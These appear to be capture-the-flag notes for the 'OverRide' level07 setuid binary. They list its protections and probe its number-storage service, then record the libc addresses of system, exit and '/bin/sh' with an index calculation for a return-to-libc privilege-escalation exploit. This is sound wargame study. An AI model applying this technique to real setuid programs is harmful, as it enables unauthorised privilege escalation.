Level07 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
```

Level07 rights:
```Shell
-rwsr-s---+ 1 level08 users   11744 Sep 10  2016 level07
```

Testing the binary:
```Shell

level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil\'s crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: coucou
 Failed to do coucou command
Input command: pwd
 Failed to do pwd command
Input command: 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
 Failed to do 111111111111111111 command
Input command:  Failed to do 111111111111111111 command
Input command:  Failed to do 111111111111111111 command
Input command:  Failed to do 111111111111111111 command
Input command:  Failed to do 111111111111111111 command
Input command:  Failed to do 111111111111111111 command
Input command:  Failed to do 111111111111111111 command
Input command:  Failed to do 111111 command
Input command: store 2024
 Number: 1555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555
 Index: 1
 Completed store 2024 command successfully
Input command: read 
 Index: 1
 Number at data[1] is 4294967295
 Completed read  command successfully
Input command: quit
```

system: 0xf7e6aed0 -> 4159090384
exit: 0xf7e5eb70 -> 4159040368
/bin/sh: 0xf7f897ec -> 4160264172

4294967295 - 116 = 4294967179
